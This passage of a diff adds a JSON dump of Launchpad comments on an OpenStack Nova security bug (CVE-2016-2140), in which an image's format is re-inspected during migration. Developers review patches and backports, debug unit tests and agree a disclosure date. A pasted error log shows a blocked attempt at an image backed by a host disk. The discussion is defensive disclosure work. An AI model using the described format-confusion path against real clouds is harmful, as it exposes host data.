backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create_from_func() is here: https://review.openstack.org/#/c/282580/ . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.\n\n[1] https://review.openstack.org/#/c/279626/", 
+            "date_created": "2016-02-26 10:11:19.644283+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now. \n\nLooking into the unshelve case we appear protected by a check within nova/virt/images.fetch_to_raw that correctly detects that a backing_file is now listed and blocks any attempt at unshelving the instance :\n\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/compute/manager.py\", line 4316, in _unshelve_instance\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     block_device_info=block_device_info)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py\", line 2516, in spawn\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     admin_pass=admin_password)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py\", line 2940, in _create_image\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     instance, size, fallback_from_host)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py\", line 6409, in _try_fetch_image_cache\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     size=size)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py\", line 240, in cache\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     *args, **kwargs)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py\", line 472, in create_image\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     prepare_template(target=base, max_size=size, *args, **kwargs)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/oslo_concurrency/lockutils.py\", line 254, in inner\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     return f(*args, **kwargs)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py\", line 230, in fetch_func_sync\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     fetch_func(target=target, *args, **kwargs)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/libvirt/utils.py\", line 406, in fetch_image\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     max_size=max_size)\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File \"/usr/lib/python2.7/site-packages/nova/virt/images.py\", line 126, in fetch_to_raw\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     {'fmt': fmt, 'backing_file': backing_file}))\n2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] ImageUnacceptable: Image 2cb1fb9e-f628-4d3f-8de8-09070c5de7fa is unacceptable: fmt=qcow2 backed by: /dev/sda3\n\n\nSo it looks like we still only have the live and cold migration cases to fix at the moment.\n", 
+            "date_created": "2016-02-26 11:54:03.904948+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch_to_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.", 
+            "date_created": "2016-02-26 14:06:16.644909+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.\nBut if it's not exploitable, then it seems like the impact description in comment #11 still holds.\n\nDoes the patch fix cold and live migrate issue ?\nIf so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.", 
+            "date_created": "2016-02-26 14:42:03.594166+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.", 
+            "date_created": "2016-02-26 16:08:46.800726+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-01 14:05:01.644708+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-01 14:05:15.143382+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-01 14:05:26.388260+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch. ", 
+            "date_created": "2016-03-01 14:09:01.449032+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Still +1 here on the above patches. I feel like we should propose a release date.", 
+            "date_created": "2016-03-01 14:36:17.761590+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.\n\nIf we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:\n2016-03-09, 1500 UTC", 
+            "date_created": "2016-03-01 15:12:15.167584+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Not sure if it's related, but stable/kilo unit tests are failing with:\n\n==============================\nFailed 1 tests - output below:\n==============================\n\nnova.tests.unit.virt.libvirt.test_driver.LibvirtDriverTestCase.test_migrate_disk_and_power_off_resize_copy_disk_info\n--------------------------------------------------------------------------------------------------------------------\n\nCaptured pythonlogging:\n~~~~~~~~~~~~~~~~~~~~~~~\n    2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.\n    \nCaptured traceback:\n~~~~~~~~~~~~~~~~~~~\n    Traceback (most recent call last):\n      File \"/home/centos/cve/nova_kilo/.tox/py27/lib/python2.7/site-packages/mock.py\", line 1201, in patched\n        return func(*args, **keywargs)\n      File \"nova/tests/unit/virt/libvirt/test_driver.py\", line 11683, in test_migrate_disk_and_power_off_resize_copy_disk_info\n        on_completion=mock.ANY, compression=mock.ANY)\n      File \"/home/centos/cve/nova_kilo/.tox/py27/lib/python2.7/site-packages/mock.py\", line 891, in assert_any_call\n        '%s call not found' % expected_string\n    AssertionError: copy_image(u'/test_resize/disk.info', u'/test/disk.info', on_execute=<ANY>, host=<mock._Sentinel object at 0x26b27d0>, on_completion=<ANY>, compres\nsion=<ANY>) call not found\n\n\n", 
+            "date_created": "2016-03-01 15:27:14.947101+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Apologies, that's another conflict, the compress argument was added to libvirt_utils.copy_image in Liberty, removing this and updating the commit message now. ", 
+            "date_created": "2016-03-01 15:39:43.831178+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "I've updated and attached the Kilo patch, apologies again.", 
+            "date_created": "2016-03-01 15:50:41.115116+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Running tox -epy27 with patch in comment #44:\n  py27: commands succeeded\n  pep8: commands succeeded\n  congratulations :)\n\nAssuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?", 
+            "date_created": "2016-03-01 16:25:46.946086+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?", 
+            "date_created": "2016-03-02 09:48:33.129256+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.\nAnd if it's sent early on Friday, it can be disclosed next Wednesday.\nFinally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.", 
+            "date_created": "2016-03-02 13:45:58.333478+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.", 
+            "date_created": "2016-03-02 19:20:25.043824+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that \"disk.info rewrite\" story on top of nova backlog.\n\nSo if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:\n2016-03-08, 1500 UTC", 
+            "date_created": "2016-03-02 20:21:52.966452+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.\n\nI'm okay with moving forward with this.", 
+            "date_created": "2016-03-02 20:38:17.289235+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-04 15:05:39.476176+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-04 15:05:52.737553+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "", 
+            "date_created": "2016-03-04 15:06:09.324092+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk_info recreation logic within pre_live_migration out of the `if not is_shared_block_storage` block. This is to avoid any potential future issues with disk_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.", 
+            "date_created": "2016-03-04 15:10:51.588821+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.\n\nAndrew (or another Nova core), could you please have a look and pre-approve those new version ?\n\nSince the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.\n\nIf this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC\nOtherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC", 
+            "date_created": "2016-03-04 19:45:39.051219+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.", 
+            "date_created": "2016-03-07 13:57:47.281284+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.", 
+            "date_created": "2016-03-08 14:52:43.680313+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Fix proposed to branch: master\nReview: https://review.openstack.org/289957", 
+            "date_created": "2016-03-08 15:02:16.214689+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Fix proposed to branch: stable/liberty\nReview: https://review.openstack.org/289958", 
+            "date_created": "2016-03-08 15:03:53.347630+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Fix proposed to branch: stable/kilo\nReview: https://review.openstack.org/289960", 
+            "date_created": "2016-03-08 15:05:58.682472+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Related fix proposed to branch: master\nReview: https://review.openstack.org/289961", 
+            "date_created": "2016-03-08 15:06:18.959353+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/289961\nCommitted: https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b\nSubmitter: Jenkins\nBranch:    master\n\ncommit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b\nAuthor: Tristan Cacqueray <email address hidden>\nDate:   Tue Mar 8 10:05:25 2016 -0500\n\n    Adds OSSA 2016-007 (CVE-2016-2140)\n    \n    Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118\n    Related-Bug: #1548450\n", 
+            "date_created": "2016-03-08 20:22:46.639159+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/289957\nCommitted: https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701\nSubmitter: Jenkins\nBranch:    master\n\ncommit 116b1210ab772c55d1ed1f715687d83877c92701\nAuthor: Lee Yarwood <email address hidden>\nDate:   Wed Feb 24 11:23:22 2016 +0000\n\n    libvirt: Always copy or recreate disk.info during a migration\n    \n    The disk.info file contains the path and format of any image, config or\n    ephermal disk associated with an instance. When using RAW images and migrating\n    an instance this file should always be copied or recreated. This avoids the Raw\n    imagebackend reinspecting the format of these disks when spawning the instance\n    on the destination host.\n    \n    By not copying or recreating this disk.info file, a malicious image written to\n    an instance disk on the source host will cause Nova to reinspect and record a\n    different format for the disk on the destination. This format then being used\n    incorrectly when finally spawning the instance on the destination.\n    \n    SecurityImpact\n    Closes-bug: #1548450\n    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87\n", 
+            "date_created": "2016-03-09 12:59:05.321842+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/289958\nCommitted: https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c\nSubmitter: Jenkins\nBranch:    stable/liberty\n\ncommit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c\nAuthor: Lee Yarwood <email address hidden>\nDate:   Wed Feb 24 11:23:22 2016 +0000\n\n    libvirt: Always copy or recreate disk.info during a migration\n    \n    The disk.info file contains the path and format of any image, config or\n    ephermal disk associated with an instance. When using RAW images and migrating\n    an instance this file should always be copied or recreated. This avoids the Raw\n    imagebackend reinspecting the format of these disks when spawning the instance\n    on the destination host.\n    \n    By not copying or recreating this disk.info file, a malicious image written to\n    an instance disk on the source host will cause Nova to reinspect and record a\n    different format for the disk on the destination. This format then being used\n    incorrectly when finally spawning the instance on the destination.\n    \n    SecurityImpact\n    Closes-bug: #1548450\n    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87\n", 
+            "date_created": "2016-03-10 01:59:45.355910+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/289960\nCommitted: https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666\nSubmitter: Jenkins\nBranch:    stable/kilo\n\ncommit f302bf04ab5dda89cf8ceaeed309006da90c0666\nAuthor: Lee Yarwood <email address hidden>\nDate:   Wed Feb 24 11:23:22 2016 +0000\n\n    libvirt: Always copy or recreate disk.info during a migration\n    \n    The disk.info file contains the path and format of any image, config or\n    ephermal disk associated with an instance. When using RAW images and migrating\n    an instance this file should always be copied or recreated. This avoids the Raw\n    imagebackend reinspecting the format of these disks when spawning the instance\n    on the destination host.\n    \n    By not copying or recreating this disk.info file, a malicious image written to\n    an instance disk on the source host will cause Nova to reinspect and record a\n    different format for the disk on the destination. This format then being used\n    incorrectly when finally spawning the instance on the destination.\n    \n    Conflicts:\n        nova/tests/unit/virt/libvirt/test_driver.py\n        nova/virt/libvirt/driver.py\n    \n    SecurityImpact\n    Closes-bug: #1548450\n    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87\n", 
+            "date_created": "2016-03-10 02:14:05.637217+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Related fix proposed to branch: master\nReview: https://review.openstack.org/291208", 
+            "date_created": "2016-03-10 14:37:37.385568+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Related fix proposed to branch: stable/liberty\nReview: https://review.openstack.org/291221", 
+            "date_created": "2016-03-10 15:08:20.810802+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/291221\nCommitted: https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793\nSubmitter: Jenkins\nBranch:    stable/liberty\n\ncommit 0b194187db9da28225cb5e62be3b45aff5a1c793\nAuthor: Matt Riedemann <email address hidden>\nDate:   Thu Mar 10 10:07:11 2016 -0500\n\n    Add release note for CVE bug 1548450\n    \n    This will go into the 12.0.3 release.\n    \n    Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26\n    Related-Bug: #1548450\n", 
+            "date_created": "2016-03-10 17:00:12.339290+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "Reviewed:  https://review.openstack.org/291208\nCommitted: https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1\nSubmitter: Jenkins\nBranch:    master\n\ncommit 9c0bbda07fdcf134308371644d09becbb18c62b1\nAuthor: Matt Riedemann <email address hidden>\nDate:   Thu Mar 10 09:35:00 2016 -0500\n\n    Add release notes for security fixes in 13.0.0 mitaka GA\n    \n    There are three security issues fixed in mitaka.\n    \n    The first two were documented for liberty 12.0.1 but we\n    apparently forgot to doc them for mitaka.\n    \n    Related-Bug: #1524274\n    Related-Bug: #1516765\n    Related-Bug: #1548450\n    \n    Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c\n", 
+            "date_created": "2016-03-10 21:52:27.161059+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }, 
+        {
+            "content": "This issue was fixed in the openstack/nova 2015.1.4 release.", 
+            "date_created": "2016-05-10 13:37:53.196329+00:00", 
+            "author": "https://api.launchpad.net/1.0/~doug-hellmann"
+        }, 
+        {
+            "content": "This issue was fixed in the openstack/nova 2015.1.4 release.", 
+            "date_created": "2016-11-10 00:55:59.577338+00:00", 
+            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
+        }
+    ]
+}
